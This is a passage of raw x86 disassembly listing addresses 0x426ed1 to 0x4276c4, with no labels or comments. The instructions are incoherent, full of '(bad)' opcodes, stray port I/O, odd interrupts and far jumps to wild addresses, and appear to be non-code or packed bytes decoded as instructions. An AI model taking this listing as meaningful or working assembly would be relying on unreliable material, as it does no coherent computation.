  426ed1:	cdq    
  426ed2:	gs int3 
  426ed4:	pop    esi
  426ed5:	not    DWORD PTR [edi-0x27e73950]
  426edb:	inc    eax
  426edc:	imul   esp,DWORD PTR [eax-0x4b],0xeafdfc27
  426ee3:	in     eax,dx
  426ee4:	aaa    
  426ee5:	mov    al,0xed
  426ee7:	das    
  426ee8:	rcr    DWORD PTR ss:[edx+ebp*1],cl
  426eec:	lock repnz pop edx
  426eef:	sbb    DWORD PTR [ebp+0x7f6a7f78],eax
  426ef5:	pusha  
  426ef6:	cld    
  426ef7:	dec    ebx
  426ef8:	retf   
  426ef9:	add    bl,BYTE PTR [edx-0x110098dd]
  426eff:	loopne 0x426f39
  426f01:	or     al,0x5c
  426f03:	xchg   esi,eax
  426f04:	loop   0x426f2d
  426f06:	cwde   
  426f07:	lea    esp,[ebp+0x232291b0]
  426f0d:	add    DWORD PTR [ebp+0x38],edx
  426f10:	adc    edx,DWORD PTR [esi-0x171bd75]
  426f16:	loop   0x426ef1
  426f18:	fs pop ds
  426f1a:	aam    0x2e
  426f1c:	mov    eax,0xd8ad17e0
  426f22:	js     0x426ec5
  426f24:	mov    dh,0xa8
  426f26:	retf   
  426f27:	out    0x7,eax
  426f29:	and    DWORD PTR [ecx-0x6d88a4fb],eax
  426f2f:	sbb    BYTE PTR [eax+0x73],0xb4
  426f33:	ja     0x426f93
  426f35:	or     DWORD PTR [eax+0xf9e7fe2],ebx
  426f3b:	pushf  
  426f3c:	lds    edi,FWORD PTR [edx+0x4b5eed76]
  426f42:	loopne 0x426f8d
  426f44:	push   edx
  426f45:	in     al,dx
  426f46:	out    dx,al
  426f47:	das    
  426f48:	sbb    ch,BYTE PTR [ebx]
  426f4a:	fimul  DWORD PTR [ebp-0x9]
  426f4d:	jmp    0x1bb010e7
  426f52:	sbb    eax,0x74de18f1
  426f57:	cmp    DWORD PTR [esi-0x12],ebx
  426f5a:	dec    esp
  426f5b:	test   al,0x4
  426f5d:	sbb    ecx,edx
  426f5f:	xlat   BYTE PTR ds:[ebx]
  426f60:	mov    BYTE PTR [eax+0x2f],ah
  426f63:	xor    DWORD PTR [ebx-0x34],ebp
  426f66:	adc    ebp,DWORD PTR [edx]
  426f68:	push   ebp
  426f69:	ins    DWORD PTR es:[edi],dx
  426f6a:	dec    esp
  426f6b:	daa    
  426f6c:	sahf   
  426f6d:	push   0x243034a9
  426f72:	data16 mov al,ds:0x2565835d
  426f78:	and    esp,DWORD PTR ds:0xc882bd6e
  426f7e:	inc    esp
  426f7f:	xor    edx,DWORD PTR [ebx+0x3]
  426f82:	xchg   edx,eax
  426f83:	into   
  426f84:	ficomp WORD PTR [ebx]
  426f86:	clc    
  426f87:	xor    edi,DWORD PTR [edi-0x35]
  426f8a:	js     0x426f2d
  426f8c:	(bad)  
  426f8d:	xchg   esi,eax
  426f8e:	xor    eax,edi
  426f90:	xor    al,0x90
  426f92:	sub    DWORD PTR [edx+0x62da4578],eax
  426f98:	pop    esi
  426f99:	dec    BYTE PTR [edx]
  426f9b:	pop    ecx
  426f9c:	mov    ds:0xed744219,al
  426fa1:	pop    edi
  426fa2:	xchg   esp,eax
  426fa3:	ss in  eax,0x65
  426fa6:	popf   
  426fa7:	stc    
  426fa8:	retf   0xec84
  426fab:	pusha  
  426fac:	hlt    
  426fad:	dec    ebx
  426fae:	out    dx,eax
  426faf:	add    BYTE PTR [edi-0x415e819d],ch
  426fb5:	out    0xf3,eax
  426fb7:	mov    eax,ds:0xd0b760ed
  426fbc:	mov    ds:0xd2e7636a,eax
  426fc1:	and    ah,bh
  426fc3:	sbb    BYTE PTR [ebx+eax*2-0x1f7b0c35],0x83
  426fcb:	cmp    eax,0xee544cfd
  426fd0:	mov    dh,0x52
  426fd2:	(bad)  
  426fd4:	aaa    
  426fd5:	pushf  
  426fd6:	or     dh,BYTE PTR cs:[esi]
  426fd9:	pop    es
  426fda:	ins    BYTE PTR es:[edi],dx
  426fdb:	scas   eax,DWORD PTR es:[edi]
  426fdc:	pop    esi
  426fdd:	js     0x427058
  426fdf:	xor    dl,0x23
  426fe2:	scas   al,BYTE PTR es:[edi]
  426fe3:	das    
  426fe4:	out    0x5d,eax
  426fe6:	cmp    BYTE PTR [ecx],dl
  426fe8:	adc    al,0xcd
  426fea:	sub    al,0xdf
  426fec:	lods   eax,DWORD PTR ds:[esi]
  426fed:	mov    eax,ds:0x1bdb70c2
  426ff2:	out    dx,al
  426ff3:	jmp    0xc56dc9c5
  426ff8:	push   esp
  426ff9:	test   DWORD PTR [edi],esp
  426ffb:	mov    eax,ds:0x52d9c99e
  427000:	and    eax,0x5e7fc7c3
  427005:	dec    esi
  427006:	or     DWORD PTR [esi-0x3b],esi
  427009:	mov    dh,0x75
  42700b:	fcom   DWORD PTR [ebx+0x27d6f860]
  427011:	jb     0x427026
  427013:	repnz loope 0x427059
  427016:	in     eax,dx
  427017:	pop    es
  427018:	sub    eax,0xd10225fc
  42701d:	xchg   esi,eax
  42701e:	(bad)  
  42701f:	fiadd  DWORD PTR ds:0x9e51f573
  427025:	pusha  
  427026:	ret    
  427027:	ins    BYTE PTR es:[edi],dx
  427028:	ret    0xd901
  42702b:	cmp    eax,0xeb30785d
  427030:	xlat   BYTE PTR ds:[ebx]
  427031:	inc    edx
  427032:	add    al,0x59
  427034:	sahf   
  427035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427036:	xchg   ebp,eax
  427037:	mov    ds:0x3fecbaeb,al
  42703c:	daa    
  42703d:	neg    edx
  42703f:	lock (bad) 
  427041:	mov    ebp,0x40a8e9ee
  427046:	retf   0x45f5
  427049:	mov    bl,0x67
  42704b:	mov    eax,ds:0x4bc1c04f
  427050:	jnp    0x426fe3
  427052:	adc    esi,DWORD PTR cs:[esi+0x50b2ee2f]
  427059:	cli    
  42705a:	mov    ds:0xc8e413f4,eax
  42705f:	mov    es,ebp
  427061:	aaa    
  427062:	add    eax,0x8bd0c0a8
  427067:	push   ecx
  427068:	iret   
  427069:	popa   
  42706a:	clc    
  42706b:	xchg   esp,eax
  42706c:	pop    edi
  42706d:	xchg   edx,eax
  42706e:	mov    al,0x44
  427070:	pop    edi
  427071:	pop    edx
  427072:	sbb    BYTE PTR [ecx-0x58],bl
  427075:	or     bh,BYTE PTR [ecx-0x7136ce60]
  42707b:	(bad)
  427080:	scas   al,BYTE PTR es:[edi]
  427081:	(bad)  
  427082:	out    dx,al
  427083:	push   ebx
  427084:	xchg   ecx,eax
  427085:	sahf   
  427086:	mov    edi,esp
  427088:	dec    ebx
  427089:	and    BYTE PTR [ebx+0x3224968f],bl
  42708f:	pop    edx
  427090:	cmp    BYTE PTR [esi],dh
  427092:	repz ja 0x427033
  427095:	cmc    
  427096:	ret    0x5e29
  427099:	pop    edi
  42709a:	mov    DWORD PTR [eax],eax
  42709c:	rol    al,0xfb
  42709f:	xchg   ch,bh
  4270a1:	pusha  
  4270a2:	shl    ebx,cl
  4270a4:	cmp    eax,0x738fd2ca
  4270a9:	mov    ebx,0xc012afec
  4270ae:	mov    al,0x41
  4270b0:	dec    ebp
  4270b1:	ds stos BYTE PTR es:[edi],al
  4270b3:	or     BYTE PTR [edx+0x6f],cl
  4270b6:	in     eax,dx
  4270b7:	mov    al,ds:0x396799de
  4270bc:	aad    0xa2
  4270be:	(bad)  
  4270c0:	pop    edi
  4270c1:	sbb    al,0xd6
  4270c3:	sar    DWORD PTR [esi+0x4a],1
  4270c6:	or     BYTE PTR [edx],dh
  4270c8:	vcvtss2sd xmm2,xmm7,DWORD PTR [ebx*4+0x2af5b35d]
  4270d1:	es jg  0x427113
  4270d4:	outs   dx,BYTE PTR ds:[esi]
  4270d5:	or     DWORD PTR [ebx],0x62205e87
  4270db:	(bad)  
  4270dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270dd:	mov    ch,0x15
  4270df:	fmul   QWORD PTR [ecx+0x64]
  4270e2:	jae    0x427149
  4270e4:	fimul  WORD PTR [esi+eiz*2-0x1581cbbf]
  4270eb:	xchg   esp,eax
  4270ec:	pop    edi
  4270ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270ee:	enter  0x2da8,0xc0
  4270f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270f3:	push   ecx
  4270f4:	pusha  
  4270f5:	inc    eax
  4270f6:	mov    WORD PTR [ecx+0x368f2a09],fs
  4270fc:	outs   dx,DWORD PTR ds:[esi]
  4270fd:	adc    edi,DWORD PTR [ebp+0x2a]
  427100:	pop    ebp
  427101:	sub    ebp,DWORD PTR [ecx]
  427103:	mov    eax,0x3b774345
  427108:	adc    DWORD PTR ds:[ebx+0x2760787b],0xfffffffd
  427110:	int    0xd1
  427112:	sub    al,0xa5
  427114:	sbb    ch,BYTE PTR [eax+0x26b004e9]
  42711a:	pop    es
  42711b:	xor    dh,bl
  42711d:	stos   DWORD PTR es:[edi],eax
  42711e:	cmp    bl,dh
  427120:	mov    BYTE PTR [esi],ch
  427122:	and    ah,BYTE PTR [esi+0x33a951e4]
  427128:	icebp  
  427129:	loopne 0x4270b0
  42712b:	push   es
  42712c:	mov    esi,0x8dbe2526
  427131:	loopne 0x4270c0
  427133:	mov    bh,0x6
  427135:	in     eax,0x97
  427137:	adc    eax,eax
  427139:	pop    edi
  42713a:	(bad)  
  42713b:	push   eax
  42713c:	in     al,0xf8
  42713e:	call   0xb1fbd203
  427143:	pusha  
  427144:	pop    esi
  427145:	mov    ebx,0x37bad352
  42714a:	es push cs
  42714c:	shl    BYTE PTR [eax+0x6a],0x11
  427150:	bound  ecx,QWORD PTR [ebx]
  427152:	stos   DWORD PTR es:[edi],eax
  427153:	loopne 0x42713f
  427155:	mov    dh,0xee
  427157:	push   ecx
  427158:	sub    eax,0x45e35905
  42715d:	pop    ebp
  42715e:	cmp    ah,BYTE PTR [ecx+0x382980d5]
  427164:	mov    ebx,0x6020867c
  427169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42716a:	or     DWORD PTR [ebx],0xfffffffe
  42716d:	cmp    eax,0x4446e169
  427172:	pop    edx
  427173:	mov    eax,ds:0x5882649a
  427178:	test   eax,0x52ea6f95
  42717d:	fstp   st(7)
  42717f:	outs   dx,BYTE PTR ds:[esi]
  427180:	ja     0x4271e2
  427182:	and    dh,bh
  427184:	ds (bad) 
  427186:	ret    0x8539
  427189:	dec    eax
  42718a:	push   edx
  42718b:	in     al,dx
  42718c:	call   0x5e9bf65f
  427191:	jmp    FWORD PTR [edx]
  427193:	not    BYTE PTR [ebp-0x6b]
  427196:	mov    bl,0xe3
  427198:	add    ah,BYTE PTR [ecx-0x1c]
  42719b:	mov    dl,0x66
  42719d:	addr16 push esi
  42719f:	out    dx,eax
  4271a0:	repnz push es
  4271a2:	in     eax,dx
  4271a3:	loope  0x427150
  4271a5:	test   DWORD PTR [edx+0x66427e79],edi
  4271ab:	das    
  4271ac:	pop    esp
  4271ad:	popa   
  4271ae:	or     DWORD PTR [ebp+0x7f],ecx
  4271b1:	pop    ss
  4271b2:	je     0x42720b
  4271b4:	addr16 repnz and al,0x72
  4271b8:	dec    ebp
  4271b9:	cmc    
  4271ba:	in     eax,dx
  4271bb:	pop    ds
  4271bc:	xor    al,0xe1
  4271be:	gs test dh,0x4c
  4271c2:	int3   
  4271c3:	repnz (bad)
  4271c6:	jmp    FWORD PTR [ebp+eax*4+0x30726e17]
  4271cd:	sbb    al,0x60
  4271cf:	mov    bh,0x5e
  4271d1:	out    dx,al
  4271d2:	imul   edi,DWORD PTR [eax+eax*4+0x58],0x60c97742
  4271da:	mov    esp,0xf218a407
  4271df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271e0:	push   cs
  4271e1:	add    eax,0x60c7e722
  4271e6:	mov    eax,ds:0x8d538c2b
  4271eb:	lock lods al,BYTE PTR ds:[esi]
  4271ed:	test   al,0xeb
  4271ef:	mov    al,ds:0xf2c7f4b9
  4271f4:	fldenv [eax+0x385ee25a]
  4271fa:	into   
  4271fb:	jmp    0x825690ad
  427200:	push   esp
  427201:	popa   
  427202:	xor    BYTE PTR [ebx-0x8],al
  427205:	fld    QWORD PTR [ebx+0x77]
  427208:	inc    ebx
  427209:	adc    al,0xee
  42720b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42720c:	fsubr  DWORD PTR [ecx+0x54]
  42720f:	xchg   esi,eax
  427210:	(bad)  
  427211:	jecxz  0x427260
  427213:	mov    eax,ds:0x897d6dcf
  427218:	inc    esp
  427219:	jp     0x4271b2
  42721b:	loop   0x42727b
  42721d:	fmul   QWORD PTR es:[eax+0x2b]
  427221:	dec    esi
  427222:	js     0x427229
  427224:	test   BYTE PTR [eax-0x6],ah
  427227:	or     al,BYTE PTR [ecx+0xf]
  42722a:	dec    eax
  42722b:	nop
  42722c:	int    0x28
  42722e:	out    dx,al
  42722f:	lds    ecx,FWORD PTR [esi]
  427231:	(bad)  
  427233:	lea    edx,[esi+eiz*2+0x6dfa45d]
  42723a:	xor    eax,0x5e6350ed
  42723f:	jae    0x42724c
  427241:	sub    ebp,esi
  427243:	retf   
  427244:	fldcw  WORD PTR [ebx-0x60e63a8f]
  42724a:	inc    ebx
  42724b:	mov    eax,ds:0x6d08a264
  427250:	or     BYTE PTR [ebp+0x3c0e00a2],0xa6
  427257:	ja     0x4272b7
  427259:	pop    eax
  42725a:	push   es
  42725b:	push   edi
  42725c:	cld    
  42725d:	int    0x85
  42725f:	fstp   DWORD PTR [edx]
  427261:	popa   
  427262:	push   edi
  427263:	xlat   BYTE PTR ds:[ebx]
  427264:	sbb    BYTE PTR [esi-0x4b],bh
  427267:	outs   dx,BYTE PTR ds:[esi]
  427268:	mov    dl,0x19
  42726a:	pop    ds
  42726b:	clc    
  42726c:	test   DWORD PTR [eax-0x2f],esp
  42726f:	add    BYTE PTR [eax+0x7e],dh
  427272:	add    esi,ebp
  427274:	in     eax,dx
  427275:	pusha  
  427276:	xor    ecx,edi
  427278:	lock out dx,eax
  42727a:	test   BYTE PTR [ebp-0xc],ch
  42727d:	or     eax,0x375ec54a
  427282:	xchg   esi,eax
  427283:	loope  0x427254
  427285:	loop   0x4272ae
  427287:	pop    es
  427288:	jmp    0x5d85eaf0
  42728d:	mov    cl,0x14
  42728f:	jmp    0x663d385c
  427294:	rol    DWORD PTR [eax-0x4],0xd7
  427298:	pop    edi
  427299:	jmp    0x427223
  42729b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42729c:	inc    eax
  42729d:	jle    0x427241
  42729f:	add    DWORD PTR [esi-0x1d383665],0x5eb9e079
  4272a9:	cmp    DWORD PTR [esi+esi*1],edi
  4272ac:	mov    eax,ds:0x52a13e33
  4272b1:	push   esp
  4272b2:	mov    eax,ds:0x8b507b38
  4272b7:	retf   0xacf0
  4272ba:	out    dx,al
  4272bb:	into   
  4272bc:	sbb    al,0x85
  4272be:	jg     0x42727a
  4272c0:	jmp    0x3763:0xbca0c89f
  4272c7:	stos   BYTE PTR es:[edi],al
  4272c8:	inc    esp
  4272c9:	mul    ebp
  4272cb:	sub    bl,BYTE PTR [ebx+0x5f]
  4272ce:	cmp    DWORD PTR [eax],ebx
  4272d0:	jle    0x42727e
  4272d2:	addr16 sbb al,0xef
  4272d5:	mov    esp,0x21745113
  4272da:	into   
  4272db:	mov    al,ds:0xd69b2901
  4272e0:	aam    0x36
  4272e2:	mov    BYTE PTR [edx],al
  4272e4:	test   BYTE PTR [esi+ebp*8-0x796d71bc],bl
  4272eb:	or     eax,0xa199efc6
  4272f0:	add    BYTE PTR [esi+0x37],al
  4272f3:	push   ds
  4272f4:	fwait
  4272f5:	es loopne 0x427376
  4272f8:	push   ss
  4272f9:	ja     0x427280
  4272fb:	mov    eax,ds:0x9b394913
  427300:	in     al,0x40
  427302:	ds jmp 0x427335
  427305:	popa   
  427306:	push   cs
  427307:	mov    DWORD PTR [ecx-0x7],0x876b2ad7
  42730e:	fs sahf 
  427310:	pop    esi
  427311:	imul   esi,DWORD PTR [edx-0x7744a8a4],0x2d
  427318:	mov    WORD PTR [edi],gs
  42731a:	mov    bl,0xa0
  42731c:	arpl   bp,dx
  42731e:	push   esi
  42731f:	jae    0x4272f6
  427321:	dec    edi
  427322:	mov    edi,0x6a965ea3
  427327:	sbb    al,0x2d
  427329:	icebp  
  42732a:	loop   0x4272e9
  42732c:	push   esp
  42732d:	popa   
  42732e:	call   0xb08:0xfade84e4
  427335:	mov    esi,0x657c7cee
  42733a:	mov    esi,DWORD PTR [ecx-0x7212bf34]
  427340:	mov    BYTE PTR [ecx-0x36d45d96],al
  427346:	pop    es
  427347:	test   DWORD PTR [eax+0x64efc6a8],ebp
  42734d:	jmp    0x12fa76fa
  427352:	or     al,BYTE PTR [ecx+0x127e7a0]
  427358:	stos   BYTE PTR es:[edi],al
  427359:	shl    BYTE PTR [edx+0x15615c29],0x11
  427360:	int3   
  427361:	pop    ss
  427362:	mov    bh,0xae
  427364:	sbb    BYTE PTR [ebp-0x12],ch
  427367:	sub    ch,0x98
  42736a:	clc    
  42736b:	cmp    BYTE PTR [eax],bh
  42736d:	sti    
  42736e:	test   al,0xa0
  427370:	inc    ebp
  427371:	push   esi
  427372:	aas    
  427373:	gs dec edi
  427375:	dec    esp
  427376:	dec    eax
  427377:	aad    0x5e
  427379:	sbb    BYTE PTR [edx-0x7be295dc],0x70
  427380:	mov    dl,0x60
  427382:	loop   0x42734a
  427384:	out    0x3f,al
  427386:	ins    DWORD PTR es:[edi],dx
  427387:	pop    esp
  427388:	xchg   BYTE PTR [edi-0x1bf3ad12],dl
  42738e:	mov    bl,BYTE PTR [ebx-0x6f764e76]
  427394:	mov    al,ds:0x992149d3
  427399:	retf   
  42739a:	jle    0x42737c
  42739c:	scas   al,BYTE PTR es:[edi]
  42739d:	sbb    esp,edi
  42739f:	sub    edx,DWORD PTR [edi]
  4273a1:	jns    0x42739f
  4273a3:	mov    ds:0xc090ffde,al
  4273a8:	mov    cl,0x60
  4273aa:	or     eax,0xa53dad8b
  4273af:	jbe    0x506296
  4273b5:	mov    DWORD PTR [esi+0x2f],esp
  4273b8:	hlt    
  4273b9:	cmp    BYTE PTR [eax-0x20bb5e5f],dl
  4273bf:	call   0x4e5e:0x8e75f7fa
  4273c6:	pop    ecx
  4273c7:	cmc    
  4273c8:	mov    cs,WORD PTR [eax+0x44]
  4273cb:	sbb    DWORD PTR [eax],ebp
  4273cd:	popa   
  4273ce:	xchg   esp,eax
  4273cf:	mov    WORD PTR [ecx],cs
  4273d1:	xor    al,0x0
  4273d3:	mov    ebx,0x85eebb26
  4273d8:	dec    DWORD PTR [eax]
  4273da:	sub    al,0xa0
  4273dc:	adc    ebx,DWORD PTR [esi]
  4273de:	repnz mov al,ds:0xd855fb7b
  4273e4:	jae    0x427452
  4273e6:	sbb    DWORD PTR [edx],0x5e
  4273e9:	pop    edi
  4273ea:	xchg   ebx,eax
  4273eb:	sub    ebx,ebx
  4273ed:	mov    ds:0x60e3cfd8,al
  4273f2:	mov    ds:0xc893899f,eax
  4273f7:	leave  
  4273f8:	mov    ah,BYTE PTR [esi-0x454fca12]
  4273fe:	repz rol DWORD PTR [edx+0x49],cl
  427402:	dec    edi
  427403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427404:	(bad)  
  427405:	ja     0x427413
  427407:	icebp  
  427408:	push   eax
  427409:	xchg   DWORD PTR [esi-0x23807e0e],eax
  42740f:	loop   0x42746f
  427411:	loope  0x4273f2
  427413:	test   al,0x8e
  427415:	and    al,0x63
  427417:	inc    eax
  427418:	hlt    
  427419:	pusha  
  42741a:	adc    BYTE PTR [edx-0x3651172f],0x78
  427421:	or     al,0xee
  427423:	pushf  
  427424:	pop    ecx
  427425:	lahf   
  427426:	ja     0x42745c
  427428:	inc    edx
  427429:	and    eax,0x863d8fe5
  42742e:	jae    0x427451
  427430:	mov    esp,0xb75f6819
  427435:	xchg   ecx,eax
  427436:	out    dx,al
  427437:	lea    esp,[eax+0x17aa70]
  42743d:	mov    ecx,ebx
  42743f:	mov    al,ds:0xe0299453
  427444:	inc    ebp
  427445:	in     al,dx
  427446:	add    cl,BYTE PTR [esi]
  427448:	pop    esi
  427449:	inc    eax
  42744a:	ins    BYTE PTR es:[edi],dx
  42744b:	or     ebp,ebx
  42744d:	rcr    BYTE PTR [eax-0x219ee8f0],1
  427453:	adc    al,0x71
  427455:	mov    dh,0xf0
  427457:	jns    0x427485
  427459:	fucomp st(3)
  42745b:	inc    eax
  42745c:	repnz mov esi,0xb8acb107
  427462:	pop    ds
  427463:	inc    esi
  427464:	aaa    
  427465:	push   esi
  427466:	mov    bl,0x1f
  427468:	add    eax,0xe4c3eefa
  42746d:	in     eax,0xf3
  42746f:	pop    edi
  427470:	push   ss
  427471:	out    0xf8,eax
  427473:	mov    al,ds:0xfafbf08
  427478:	pop    es
  427479:	push   edi
  42747a:	push   ds
  42747b:	mov    al,ds:0xe2786775
  427480:	sahf   
  427481:	adc    ecx,DWORD PTR [esi+edi*1]
  427484:	mov    al,BYTE PTR [eax-0x18]
  427487:	dec    esi
  427488:	ins    DWORD PTR es:[edi],dx
  427489:	pop    es
  42748a:	sbb    DWORD PTR [ebx-0x1d469f8c],ebx
  427490:	mov    ?,ecx
  427492:	sahf   
  427493:	mov    ecx,0x41dc87af
  427498:	pop    esi
  427499:	aas    
  42749a:	adc    eax,0x1aa77f62
  42749f:	mov    bl,0xb2
  4274a1:	pusha  
  4274a2:	dec    eax
  4274a3:	jae    0x427479
  4274a5:	pop    ecx
  4274a6:	les    edi,FWORD PTR [esi-0x16110e7b]
  4274ac:	mov    cl,0x17
  4274ae:	push   ds
  4274af:	(bad)  
  4274b0:	and    DWORD PTR [edi+0x74],eax
  4274b3:	mov    ds:0x8a38082b,al
  4274b8:	ret    0xb86e
  4274bb:	jl     0x427501
  4274bd:	in     al,0xee
  4274bf:	(bad)  
  4274c0:	outs   dx,DWORD PTR ds:[esi]
  4274c1:	jle    0x427470
  4274c3:	jle    0x42752b
  4274c5:	fiadd  DWORD PTR [edx]
  4274c7:	mov    eax,ds:0xdca251b5
  4274cc:	jp     0x42750a
  4274ce:	repz xlat BYTE PTR ds:[ebx]
  4274d0:	pop    esi
  4274d1:	test   eax,0x5b022eb6
  4274d6:	xor    DWORD PTR [ebx],edx
  4274d8:	and    BYTE PTR [ecx+0x7],ah
  4274db:	xchg   esp,eax
  4274dc:	jecxz  0x427525
  4274de:	test   BYTE PTR [esi-0x5b112ae6],al
  4274e4:	jae    0x4274c3
  4274e6:	imul   ebp,DWORD PTR [esi-0x6d],0x74a4c578
  4274ed:	sti    
  4274ee:	stos   DWORD PTR es:[edi],eax
  4274ef:	mov    BYTE PTR [eax-0x5002660],0xc4
  4274f6:	or     BYTE PTR [ebp-0x1315c941],bl
  4274fc:	jle    0x4274b9
  4274fe:	adc    DWORD PTR [bx+di+0x2df8],ecx
  427503:	aam    0xc2
  427505:	retf   
  427506:	push   edx
  427507:	inc    dx
  427509:	popa   
  42750a:	inc    BYTE PTR es:[edx+0x1e8161c8]
  427511:	push   ebx
  427512:	repnz nop
  427514:	dec    esp
  427515:	and    al,bh
  427517:	pusha  
  427518:	jmp    0xa8d8:0x5cab9f60
  42751f:	test   bl,ah
  427521:	fucomip st,st(6)
  427523:	jg     0x427544
  427525:	cmp    eax,0x2733e3a1
  42752a:	mov    dl,0xa0
  42752c:	out    dx,eax
  42752d:	mov    ebp,0x785f2969
  427532:	and    al,0x8d
  427534:	xor    dl,BYTE PTR [ebp+0x51c22c1c]
  42753a:	mov    ebx,0xba806ca4
  42753f:	mov    edi,0xa0c18451
  427544:	sti    
  427545:	call   DWORD PTR [ecx+0x6d3aa682]
  42754b:	nop
  42754c:	cmp    ah,bl
  42754e:	jo     0x4275b9
  427550:	pop    esi
  427551:	mov    dh,0x34
  427553:	adc    ch,BYTE PTR [ebx]
  427555:	in     al,0xd1
  427557:	lods   eax,DWORD PTR ds:[esi]
  427558:	sti    
  427559:	inc    edi
  42755a:	out    dx,al
  42755b:	popa   
  42755c:	inc    edx
  42755d:	mov    BYTE PTR [ebx],bh
  42755f:	xlat   BYTE PTR ds:[ebx]
  427560:	dec    edi
  427561:	mov    bh,0x1f
  427563:	call   DWORD PTR [edi+0x61]
  427566:	jl     0x4275df
  427568:	icebp  
  427569:	int    0xa5
  42756b:	pop    ebx
  42756c:	aaa    
  42756d:	popa   
  42756e:	popf   
  42756f:	loop   0x427536
  427571:	inc    esi
  427572:	pop    ds
  427573:	in     eax,0xaa
  427575:	dec    ebp
  427576:	out    dx,al
  427577:	call   0x7dcb:0x4ce9fa5f
  42757e:	sub    ah,BYTE PTR [ecx+0x1d1d837e]
  427584:	ror    DWORD PTR [esi-0x55a3d1aa],cl
  42758a:	and    ecx,DWORD PTR [edx-0x608941a9]
  427590:	sub    al,0xce
  427592:	add    al,0x7
  427594:	pop    esi
  427595:	repnz out dx,eax
  427597:	fcom   QWORD PTR [ebx]
  427599:	fsub   DWORD PTR [eax]
  42759b:	sbb    dl,cl
  42759d:	loopne 0x42759f
  42759f:	or     edx,DWORD PTR [edx]
  4275a1:	lock ins DWORD PTR es:[edi],dx
  4275a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275a4:	or     ah,BYTE PTR [eax-0x78]
  4275a7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4275a9:	inc    esi
  4275aa:	mov    ecx,0x9520c256
  4275af:	je     0x427532
  4275b1:	mov    edi,0x90ee93f0
  4275b6:	scas   al,BYTE PTR es:[edi]
  4275b7:	pop    edi
  4275b8:	popf   
  4275b9:	pop    ecx
  4275ba:	mov    ebp,0x73e4be78
  4275bf:	and    BYTE PTR [ebx-0x30fd65a0],bl
  4275c5:	xor    al,0x76
  4275c7:	cmc    
  4275c8:	jnp    0x4275bf
  4275ca:	out    dx,al
  4275cb:	ret    
  4275cc:	popf   
  4275cd:	sbb    DWORD PTR [ebx-0xc],0x2c
  4275d1:	push   ss
  4275d2:	pop    ebp
  4275d3:	lahf   
  4275d4:	mov    al,0xd2
  4275d6:	imul   esp,DWORD PTR [edx],0xa94d307e
  4275dc:	mov    ebp,0x4b565852
  4275e1:	or     edi,DWORD PTR [eax]
  4275e3:	stos   BYTE PTR es:[edi],al
  4275e4:	pop    esi
  4275e5:	(bad)  
  4275e6:	or     cl,BYTE PTR [ebp-0x5ee979e0]
  4275ec:	lahf   
  4275ed:	ins    DWORD PTR es:[edi],dx
  4275ee:	jmp    0xfe51309d
  4275f3:	xchg   esp,eax
  4275f4:	in     al,dx
  4275f5:	(bad)  
  4275f7:	jb     0x42757f
  4275f9:	(bad)  
  4275fa:	dec    eax
  4275fb:	mov    ds:0xed603c5e,al
  427600:	mov    cl,0xe8
  427602:	sbb    BYTE PTR [edi-0x6cbe7f57],bl
  427608:	push   ds
  427609:	mov    ch,0x4b
  42760b:	out    dx,al
  42760c:	aaa    
  42760d:	cli    
  42760e:	out    dx,al
  42760f:	fs dec ebx
  427611:	cmp    ecx,edx
  427613:	enter  0x828,0x55
  427617:	xchg   ebx,eax
  427618:	jge    0x42766f
  42761a:	mov    esp,0x46aa32a7
  42761f:	xor    eax,0x658a120
  427624:	pop    ecx
  427625:	fisttp QWORD PTR [edx]
  427627:	mov    dh,0x82
  427629:	push   ecx
  42762a:	cli    
  42762b:	test   BYTE PTR [esi+0x1fbc6260],dl
  427631:	std    
  427632:	popf   
  427633:	inc    esi
  427634:	shrd   DWORD PTR [ecx],edx,cl
  427637:	test   al,0xab
  427639:	sbb    edx,DWORD PTR [eax+0x17]
  42763c:	mov    eax,esi
  42763e:	(bad)  
  42763f:	cli    
  427640:	mov    dh,0x7a
  427642:	dec    eax
  427643:	push   ebx
  427644:	xor    eax,0xa9906645
  427649:	ins    DWORD PTR es:[edi],dx
  42764a:	out    dx,al
  42764b:	or     BYTE PTR [ecx+0x74],ah
  42764e:	or     ch,BYTE PTR [ebx]
  427650:	pop    ebx
  427651:	popa   
  427652:	test   DWORD PTR ds:0xc2521fb,esi
  427658:	out    0xbe,al
  42765a:	out    dx,al
  42765b:	inc    ebx
  42765c:	mov    ebx,0xd187c926
  427661:	js     0x427654
  427663:	stos   DWORD PTR es:[edi],eax
  427664:	dec    esp
  427665:	mov    ch,BYTE PTR [ebx-0x73]
  427668:	xor    cl,BYTE PTR [edi+ebx*2-0x75]
  42766c:	xchg   esi,eax
  42766d:	adc    DWORD PTR [esi+0x5c],esp
  427670:	pop    esi
  427671:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427673:	and    dh,BYTE PTR [ebp+0x1]
  427676:	rcl    BYTE PTR ds:0xa0bbac9c,1
  42767c:	jecxz  0x4276b1
  42767e:	mov    edx,0xd5d892c0
  427683:	or     eax,0x444ea35e
  427688:	jg     0x427636
  42768a:	pushf  
  42768b:	fscale 
  42768d:	pusha  
  42768e:	pop    ss
  42768f:	push   es
  427690:	push   edi
  427691:	test   eax,0x8f49a608
  427696:	out    dx,al
  427697:	loope  0x427662
  427699:	test   eax,0x11942910
  42769e:	int    0xa0
  4276a0:	in     eax,0xf2
  4276a2:	int3   
  4276a3:	xchg   edx,eax
  4276a4:	xchg   edi,eax
  4276a5:	fnstcw WORD PTR [edx]
  4276a7:	int    0x44
  4276a9:	rcl    BYTE PTR [eax-0x6e],0x5e
  4276ad:	add    ecx,DWORD PTR [eax-0x12336ffc]
  4276b3:	mov    al,ds:0x5753ec67
  4276b8:	dec    ebx
  4276b9:	rcl    BYTE PTR [edi+0x42cb5e09],cl
  4276bf:	or     eax,0xae0e1f68
  4276c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
